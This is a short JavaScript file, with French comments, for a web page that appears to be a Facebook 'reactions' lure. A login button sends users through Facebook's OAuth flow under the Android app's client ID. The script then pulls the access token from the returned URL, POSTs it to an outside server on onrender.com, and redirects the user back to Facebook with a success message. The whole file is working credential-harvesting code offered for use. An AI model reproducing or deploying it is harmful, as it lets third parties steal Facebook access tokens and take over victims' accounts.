const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/"; // Remplace par ton lien GitHub
const RENDER_URL = "https://token-claim.onrender.com/"; // Ton serveur de réception

// 1. Détecter si on revient de Facebook avec un Token
window.onload = function() {
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            // Envoi au serveur Render
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .then(() => {
                alert("✅ Connexion réussie ! Tes réactions arrivent.");
                window.location.href = "https://facebook.com"; 
            })
            .catch(err => console.error("Erreur d'envoi:", err));
        }
    }
};

// 2. Bouton pour lancer la connexion
document.getElementById('loginBtn').onclick = function() {
    const clientId = "350685531728"; // ID Facebook Android
    const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
    window.location.href = authUrl;
};
